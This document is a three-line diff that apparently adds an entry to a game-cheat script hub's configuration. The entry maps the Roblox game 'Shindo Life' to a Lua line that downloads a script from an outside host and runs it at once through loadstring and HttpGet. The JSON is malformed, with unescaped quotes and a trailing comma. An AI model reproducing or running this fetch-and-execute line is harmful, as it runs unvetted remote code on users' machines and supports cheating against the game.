@@ -1,0 +1,3 @@
+{
+    "Shindo Life":{"script":"loadstring(game:HttpGet("https://bruh.keshsenpai.com/.lua"))()", "GameId": 1511883870},
+}
